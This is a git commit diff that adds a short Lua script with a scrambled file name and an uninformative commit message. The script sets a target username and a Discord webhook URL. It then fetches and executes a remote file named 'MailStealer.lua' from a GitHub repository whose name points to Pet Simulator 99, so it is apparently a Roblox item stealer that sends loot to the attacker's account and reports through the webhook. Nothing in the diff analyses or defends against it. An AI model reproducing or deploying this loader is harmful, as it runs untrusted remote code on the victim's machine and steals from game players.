96892d7adcb17d1573cb6d7e0e103e57e7c6d424
SharkNan <98608938+SharkNan@users.noreply.github.com>
2024-11-23 19:13:59 +0200

    ww
    ww

---
+++ obf_I5114Y7h0kFM60sBIL7O2pd5G78jE9a67Qv4ihtb1OrbMYZfIeNd5dq7R0pFnC4E (1).lua
@@ -0,0 +1,6 @@
+Username = "CASIANSIYANIS"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1235945229694144543/-MS9Kk4TFMi2plPQ89VrYs0BwcMwQ0Bixk7woKt5hKLW7g8YERG6kWL_301yrRo6kxso"
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
